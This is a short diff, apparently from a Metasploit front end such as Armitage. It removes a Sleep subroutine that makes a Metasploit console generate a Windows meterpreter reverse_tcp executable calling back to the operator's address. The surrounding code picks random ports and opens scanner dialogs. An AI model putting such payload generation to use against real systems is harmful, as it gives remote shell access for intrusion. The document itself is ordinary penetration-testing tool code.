@@ -277,23 +277,6 @@ sub randomPort {
 	return int( 1024 + (rand() * 1024 * 30) );
 }
 
-sub meterpreterPayload {
-	local('$port $tmp_console');
-	$port = randomPort();
-
-	$tmp_console = createConsole($client);
-	cmd_all_async($client, $tmp_console, @(
-		"use windows/meterpreter/reverse_tcp",
-		"set LHOST $MY_ADDRESS",
-		"generate -t exe -f $1",
-		"back"), lambda({ 
-			if ($1 eq "back\n") {
-				call($client, "console.destroy", $tmp_console); 
-			}
-			invoke($f, @_); 
-		}, $f => $2, \$tmp_console));
-}
-
 sub scanner {
 	return lambda({
 		launch_dialog("Scan ( $+ $type $+ )", "auxiliary", "scanner/ $+ $type", $host);
